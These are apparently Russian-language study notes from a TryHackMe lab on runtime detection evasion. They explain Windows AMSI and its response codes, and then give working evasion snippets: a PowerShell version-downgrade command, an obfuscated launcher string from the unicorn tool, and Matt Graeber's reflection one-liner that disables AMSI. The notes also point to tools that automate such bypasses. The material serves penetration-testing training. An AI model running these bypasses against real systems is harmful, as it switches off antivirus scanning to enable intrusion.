```http
https://tryhackme.com/room/runtimedetectionevasion
```
___
___
___
# Обнаружения во время выполнения
Средства обнаружения во время выполнения отличаются от стандартных антивирусных программ тем, что они сканируют непосредственно память и среду выполнения. В то же время антивирусные продукты также могут использовать эти средства обнаружения во время выполнения для более глубокого понимания вызовов и перехватов, исходящих из кода. В некоторых случаях антивирусные продукты могут использовать поток/канал обнаружения во время выполнения в рамках своей эвристики.
```http
https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
```
AMSI — это средство обнаружения [вредоносных  программ](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) [**,**](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) встроенное в Windows и являющееся интерфейсом для других продуктов и решений.
___
___
# Обзор AMSI
AMSI ( **Anti** - **Malware** Scan  **Interface** ) — это функция безопасности PowerShell , которая позволяет любым приложениям или службам напрямую интегрироваться в антивирусные продукты.
```http
https://docs.microsoft.com/en-us/windows/win32/amsi/
```

AMSI определит свои действия на основе кода ответа, полученного в результате мониторинга и сканирования. Ниже представлен список возможных кодов ответа.

- AMSI_RESULT_CLEAN = 0
- AMSI_RESULT_NOT_DETECTED = 1
- AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
- AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
- AMSI_RESULT_DETECTED = 32768
Эти коды ответов будут сообщаться только на бэкенде AMSI или через стороннюю реализацию. Если AMSI обнаружит вредоносный результат, выполнение будет остановлено и отправлено следующее сообщение об ошибке.  

```powershell
PS C:Users\Tryhackme> 'Invoke-Hacks' At line:1 char:1 + "Invoke-Hacks" + ~~~~~~~~~~~~~~ This script contains malicious content and has been blocked by your antivirus software. + CategoryInfo : ParserError: (:) []. ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
AMSI полностью интегрирован в следующие компоненты Windows:
- Контроль учетных записей пользователей, или UAC
- PowerShell
- Хост скриптов Windows (wscript и cscript)
- JavaScript и VBScript
- Макросы Office VBA
___
___
# Инструментарий AMSI
 AMSI — это всего лишь интерфейс для других антивирусных продуктов; AMSI будет использовать несколько DLL-библиотек провайдера и вызовы API в зависимости от того, что именно выполняется и на каком уровне.
AMSI инструментируется с помощью AMSI `System.Management.Automation.dll`, сборки .NET, разработанной Windows. Согласно документации Microsoft, «сборки образуют фундаментальные единицы развертывания, управления версиями, повторного использования, определения области действия активации и разрешений безопасности для приложений .NET».  Сборка .NET инструментируется другими библиотеками DLL и вызовами API в зависимости от интерпретатора и от того, находятся ли они на диске или в памяти. На диаграмме ниже показано, как данные анализируются по мере прохождения через уровни и какие библиотеки DLL/ вызовы API инструментируются.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png)  

На представленном выше графике данные будут передаваться в зависимости от используемого интерпретатора ( PowerShell /VBScript и т.д.). Различные вызовы API и интерфейсы будут обрабатываться по мере прохождения данных по модели на каждом уровне. Важно понимать всю модель AMSI , но мы можем разбить её на основные компоненты, показанные на диаграмме ниже. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png)  

Примечание: AMSI инструментируется только при загрузке из памяти и запуске из CLR. Предполагается, что инструментирование MsMpEng.exe (Защитника Windows) на диске уже выполняется.
Сторонние поставщики, например, AV- решения, могут использовать AMSI в своих продуктах. Microsoft документирует  [функции](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions) [AMSI](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions)  и  [потоковый интерфейс](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream) [AMSI](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream) .
___
___
# Понижение версии PowerShell
Атака с понижением версии PowerShell — это очень простая задача, которая позволяет злоумышленникам изменить текущую версию PowerShell , чтобы удалить функции безопасности.
Большинство сеансов PowerShell запускаются с использованием последней версии PowerShell , но злоумышленники могут вручную изменить её версию с помощью одной строки. «Понижая» версию PowerShell до 2.0, вы обходите функции безопасности, поскольку они были реализованы только в версии 5.0.

```powershell
PowerShell -Version 2
```

```powershell
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```
!!!!!!!!!!!!!!!!!!!!!
```http
https://github.com/trustedsec/unicorn
```
!!!!!!!!!!!!!!!!!!!!!!!!!
> Поскольку эта атака настолько легко осуществима и технически проста, у синей команды есть множество способов обнаружить и нейтрализовать ее.

___
___
# PowerShell Reflection
Reflection позволяет пользователю или администратору получать доступ к сборкам .NET и взаимодействовать с ними.
Отражение PowerShell может быть использовано для изменения и идентификации информации из ценных DLL-библиотек.
Утилиты AMSI для PowerShell хранятся в `AMSIUtils`сборке .NET, расположенной в `System.Management.Automation.AmsiUtils`.

Мэтт Грэбер опубликовал однострочный код для использования Reflection для модификации и обхода утилиты AMSI . Этот однострочный код можно увидеть в блоке кода ниже.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
___
___
# Автоматизация для удовольствия и прибыли
[Команда amsi .fail](http://amsi.fail/) скомпилирует и сгенерирует обход PowerShell из набора известных обходов. Из команды amsi .fail: « AMSI .fail генерирует обфусцированные фрагменты PowerShell , которые нарушают или отключают AMSI для текущего процесса. Фрагменты выбираются случайным образом из небольшого набора методов/вариаций перед обфускацией. Каждый фрагмент обфусцируется во время выполнения/запроса, чтобы никакие сгенерированные выходные данные не имели одинаковых сигнатур».
___
```http
https://github.com/RythmStick/AMSITrigger
```

[AMSITrigger](https://github.com/RythmStick/AMSITrigger) позволяет злоумышленникам автоматически определять строки, содержащие сигнатуры, чтобы изменять и взламывать их. Этот метод обхода AMSI более надежен, чем другие, поскольку сам файл становится чистым.
